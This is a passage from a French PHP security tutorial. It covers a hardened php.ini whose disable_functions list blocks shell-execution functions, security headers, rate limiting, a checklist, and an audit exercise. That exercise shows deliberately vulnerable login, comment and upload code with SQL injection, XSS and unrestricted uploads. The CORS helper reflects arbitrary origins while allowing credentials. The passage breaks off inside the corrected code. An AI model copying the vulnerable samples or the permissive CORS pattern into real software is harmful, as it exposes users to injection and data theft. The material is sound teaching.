            'application/msword' =&gt; ['doc'],
            'application/vnd.openxmlformats-officedocument.wordprocessingml.document' =&gt; ['docx']
        ];
        
        return isset($validCombos[$mimeType]) && 
               in_array($extension, $validCombos[$mimeType]);
    }
}
?&gt;</code></pre>

    <h3>20.5 Configuration de s√©curit√© PHP</h3>
    
    <h4>php.ini s√©curis√© pour la production :</h4>
    <pre><code>; === S√âCURIT√â PHP - CONFIGURATION PRODUCTION ===

; Cacher les erreurs aux utilisateurs
display_errors = Off
display_startup_errors = Off
log_errors = On
error_log = /var/log/php/error.log

; Cacher la version PHP
expose_php = Off

; Limiter les fonctions dangereuses
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source

; Upload s√©curis√©
file_uploads = On
upload_max_filesize = 5M
post_max_size = 10M
max_file_uploads = 5

; Session s√©curis√©e
session.cookie_httponly = 1
session.cookie_secure = 1
session.cookie_samesite = "Strict"
session.use_strict_mode = 1
session.cookie_lifetime = 0
session.gc_maxlifetime = 86400

; Autres s√©curit√©s
allow_url_fopen = Off
allow_url_include = Off
max_execution_time = 30
max_input_time = 30
memory_limit = 128M

; Headers de s√©curit√©
; (√† configurer aussi via Apache/Nginx)
</code></pre>

    <h3>20.6 Headers de s√©curit√©</h3>
    
    <h4>Configuration des headers s√©curis√©s :</h4>
    <pre><code>&lt;?php
class SecurityHeaders {
    
    public static function setSecurityHeaders() {
        // Protection XSS
        header('X-XSS-Protection: 1; mode=block');
        
        // Emp√™cher le sniffing de type MIME
        header('X-Content-Type-Options: nosniff');
        
        // Protection contre le clickjacking
        header('X-Frame-Options: DENY');
        
        // Content Security Policy
        header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' cdn.jsdelivr.net; img-src 'self' data:; font-src 'self' cdn.jsdelivr.net");
        
        // Strict Transport Security (HTTPS uniquement)
        if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') {
            header('Strict-Transport-Security: max-age=31536000; includeSubDomains; preload');
        }
        
        // Referrer Policy
        header('Referrer-Policy: strict-origin-when-cross-origin');
        
        // Feature Policy
        header("Feature-Policy: geolocation 'none'; microphone 'none'; camera 'none'");
    }
    
    public static function setNoCacheHeaders() {
        header('Cache-Control: no-cache, no-store, must-revalidate, private');
        header('Pragma: no-cache');
        header('Expires: 0');
    }
    
    public static function setCORSHeaders($allowedOrigins = ['*']) {
        $origin = $_SERVER['HTTP_ORIGIN'] ?? '';
        
        if (in_array('*', $allowedOrigins) || in_array($origin, $allowedOrigins)) {
            header("Access-Control-Allow-Origin: $origin");
        }
        
        header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS');
        header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With');
        header('Access-Control-Allow-Credentials: true');
        header('Access-Control-Max-Age: 86400');
    }
}

// Middleware de s√©curit√©
class SecurityMiddleware {
    
    public static function enforce() {
        // Appliquer les headers de s√©curit√©
        SecurityHeaders::setSecurityHeaders();
        
        // D√©marrer la session de mani√®re s√©curis√©e
        self::secureSessionStart();
        
        // V√©rifier les limites de taux
        self::rateLimiting();
        
        // V√©rifier les IP bannies
        self::checkBannedIPs();
    }
    
    private static function secureSessionStart() {
        if (session_status() === PHP_SESSION_NONE) {
            // Configuration de session s√©curis√©e
            ini_set('session.cookie_httponly', 1);
            ini_set('session.cookie_secure', isset($_SERVER['HTTPS']));
            ini_set('session.cookie_samesite', 'Strict');
            ini_set('session.use_strict_mode', 1);
            
            session_start();
            
            // R√©g√©n√©rer l'ID de session p√©riodiquement
            if (!isset($_SESSION['session_regenerated'])) {
                session_regenerate_id(true);
                $_SESSION['session_regenerated'] = time();
            } elseif (time() - $_SESSION['session_regenerated'] &gt; 300) {
                session_regenerate_id(true);
                $_SESSION['session_regenerated'] = time();
            }
        }
    }
    
    private static function rateLimiting() {
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
        $key = "rate_limit_$ip";
        
        if (!isset($_SESSION[$key])) {
            $_SESSION[$key] = ['count' =&gt; 1, 'start' =&gt; time()];
        } else {
            $data = $_SESSION[$key];
            
            // Reset si plus d'une minute
            if (time() - $data['start'] &gt; 60) {
                $_SESSION[$key] = ['count' =&gt; 1, 'start' =&gt; time()];
            } else {
                $_SESSION[$key]['count']++;
                
                // Bloquer si trop de requ√™tes
                if ($data['count'] &gt; 100) { // 100 requ√™tes par minute max
                    http_response_code(429);
                    die('Too Many Requests');
                }
            }
        }
    }
    
    private static function checkBannedIPs() {
        $ip = $_SERVER['REMOTE_ADDR'] ?? '';
        $bannedIPs = [
            // Liste des IP bannies
            // '192.168.1.100',
            // '10.0.0.50'
        ];
        
        if (in_array($ip, $bannedIPs)) {
            http_response_code(403);
            die('Access Forbidden');
        }
    }
}

// Utilisation en d√©but d'application
SecurityMiddleware::enforce();
?&gt;</code></pre>

    <h3>20.7 Checklist finale de s√©curit√©</h3>
    
    <div style="background: linear-gradient(135deg, #e8f5e8 0%, #d4edda 100%); padding: 20px; border-radius: 10px; margin: 20px 0;">
        <h4>‚úÖ Checklist compl√®te de s√©curit√© PHP</h4>
        
        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 15px; margin: 15px 0;">
            <div>
                <h5>üóÑÔ∏è Base de donn√©es :</h5>
                <ul style="margin: 0;">
                    <li>‚úÖ Requ√™tes pr√©par√©es uniquement</li>
                    <li>‚úÖ Validation de toutes les entr√©es</li>
                    <li>‚úÖ Principe du moindre privil√®ge (utilisateur DB)</li>
                    <li>‚úÖ Chiffrement des donn√©es sensibles</li>
                    <li>‚úÖ Sauvegardes r√©guli√®res et chiffr√©es</li>
                </ul>
            </div>
            
            <div>
                <h5>üîê Authentification :</h5>
                <ul style="margin: 0;">
                    <li>‚úÖ Hash des mots de passe (password_hash)</li>
                    <li>‚úÖ Politique de mots de passe forts</li>
                    <li>‚úÖ Protection contre la force brute</li>
                    <li>‚úÖ Sessions s√©curis√©es</li>
                    <li>‚úÖ Authentification √† deux facteurs</li>
                </ul>
            </div>
            
            <div>
                <h5>üåê Web :</h5>
                <ul style="margin: 0;">
                    <li>‚úÖ Protection XSS (htmlspecialchars)</li>
                    <li>‚úÖ Protection CSRF (tokens)</li>
                    <li>‚úÖ Headers de s√©curit√©</li>
                    <li>‚úÖ HTTPS partout</li>
                    <li>‚úÖ Validation c√¥t√© serveur</li>
                </ul>
            </div>
            
            <div>
                <h5>üìÅ Fichiers :</h5>
                <ul style="margin: 0;">
                    <li>‚úÖ Validation stricte des uploads</li>
                    <li>‚úÖ Dossier uploads hors web root</li>
                    <li>‚úÖ Permissions fichiers appropri√©es</li>
                    <li>‚úÖ Scan antivirus si possible</li>
                    <li>‚úÖ Pas d'ex√©cution des uploads</li>
                </ul>
            </div>
        </div>
    </div>

    <h3>20.8 Exercice final : Audit de s√©curit√©</h3>
    
    <p><strong>Objectif :</strong> Analyser et corriger les failles de s√©curit√© dans un code vuln√©rable.</p>
    
    <p><strong>Code √† auditer :</strong></p>
    <pre><code>&lt;?php
// ‚ùå CODE VULN√âRABLE - Trouvez les failles !
session_start();

$pdo = new PDO("mysql:host=localhost;dbname=test", "root", "");

if (isset($_POST['login'])) {
    $email = $_POST['email'];
    $password = $_POST['password'];
    
    $sql = "SELECT * FROM users WHERE email = '$email' AND password = '$password'";
    $result = $pdo-&gt;query($sql);
    $user = $result-&gt;fetch();
    
    if ($user) {
        $_SESSION['user'] = $user;
        header("Location: dashboard.php");
    } else {
        echo "Connexion √©chou√©e";
    }
}

if (isset($_POST['comment'])) {
    $comment = $_POST['comment'];
    $user_id = $_SESSION['user']['id'];
    
    $sql = "INSERT INTO comments (user_id, comment) VALUES ($user_id, '$comment')";
    $pdo-&gt;query($sql);
    
    echo "Commentaire : " . $comment;
}

if (isset($_FILES['photo'])) {
    $filename = $_FILES['photo']['name'];
    move_uploaded_file($_FILES['photo']['tmp_name'], "uploads/" . $filename);
    echo "Photo upload√©e : " . $filename;
}
?&gt;</code></pre>

    <details>
        <summary><strong>üí° Voir les failles et corrections</strong></summary>
        <pre><code>üîç FAILLES IDENTIFI√âES :

1. ‚ùå Injection SQL dans la connexion
2. ‚ùå Mot de passe en clair (pas de hash)
3. ‚ùå Pas de validation des donn√©es
4. ‚ùå XSS dans l'affichage du commentaire
5. ‚ùå Upload de fichier non s√©curis√©
6. ‚ùå Session non s√©curis√©e
7. ‚ùå Pas de protection CSRF
8. ‚ùå Erreurs r√©v√©latrices
9. ‚ùå Configuration PDO non s√©curis√©e

‚úÖ CODE CORRIG√â :

&lt;?php
// Configuration s√©curis√©e
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', isset($_SERVER['HTTPS']));
session_start();

try {
    $pdo = new PDO(
        "mysql:host=localhost;dbname=test;charset=utf8mb4", 
        "user_limited", 
        "strong_password",
        [
            PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_ASSOC,
            PDO::ATTR_EMULATE_PREPARES =&gt; false
        ]
    );
} catch (PDOException $e) {
    error_log($e-&gt;getMessage());
    die
       </section>
                </div>
            </div>

        </main>
    </div>
</body>
</html>